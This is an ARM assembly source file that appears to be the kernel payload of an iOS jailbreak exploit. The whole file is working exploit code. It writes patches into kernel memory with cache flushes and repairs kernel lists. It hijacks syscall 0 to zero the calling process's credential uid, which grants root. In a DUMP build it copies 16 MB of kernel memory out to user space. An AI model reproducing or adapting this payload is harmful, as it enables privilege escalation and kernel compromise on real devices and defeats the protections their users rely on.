#if VERSION >= 0x040300
#define c(a, b) a
#else
#define c(a, b) b
#endif

.syntax unified
.arm
start:
    # xxx offset
    ldr sp, [sp, #(856 + 0x38 - 0x98)]
    sub sp, #0x18
    ldr r6, [r4]

    adr r0, inspiring
    bl _IOLog

    #mov r8, #0; b end

    adr r5, stuff
    ldr r8, count

pf_loop:
    ldm r5, {r0, r2}
    add r1, r5, #8
    bl _memcpy
    ldm r5, {r0, r1}
    mov r2, #0
    bl _flush_dcache
    ldm r5!, {r0, r1}
    add r5, r1
    mov r2, #0
    bl _invalidate_icache
    
    subs r8, #1
    bne pf_loop

end:
    bl _IOLockAlloc
    str r0, [r6, #c(0x2d8, 0x23c)]
    str r8, [r6, #c(0x238, 0x19c)]
    str r8, [r6, #c(0x2d4, 0x238)]
    # fix up linked lists
    add r0, r6, #c(0x218, 0x180)
    str r0, [r6, #c(0x21c, 0x184)]
    add r0, r6, #c(0x220, 0x188)
    str r0, [r6, #c(0x220, 0x188)]
    str r0, [r6, #c(0x224, 0x18c)]

#if defined(DEJAVU) || defined(DUMP)
    ldr r0, sysent
    adr r1, syscall_0
    str r1, [r0, #0x4]
#endif

#ifdef DUMP
    mov r0, #(16*1024*1024)
    bl _IOMalloc
    str r0, dumpbuf
    mov r1, #0x80000000
    mov r2, #(16*1024*1024)
    bl _memcpy
#endif

    pop {r8, r10, r11}
    pop {r4-r7, pc}

#if defined(DEJAVU) || defined(DUMP)
syscall_0:
    push {lr} 
#ifdef DUMP
    ldr r0, dumpbuf
    mov r1, #0x10000000 
    mov r2, #(16*1024*1024)
    bl _copyout
#else
    bl _proc_ucred
    mov r1, #0
    str r1, [r0, #0xc]
    ldr r0, [r0, #0x6c]
    cmp r0, #0
    strne r1, [r0, #8]
#endif
    ldr r0, sysent
    ldr r1, [r0, #0xc4]
    str r1, [r0, #0x4]
    pop {pc}
#endif
    

inspiring: .asciz "I exist!\n"
.align 2
#ifdef DUMP
dumpbuf: .long 0
#endif
sysent: .long 0
count: .long 0
stuff:

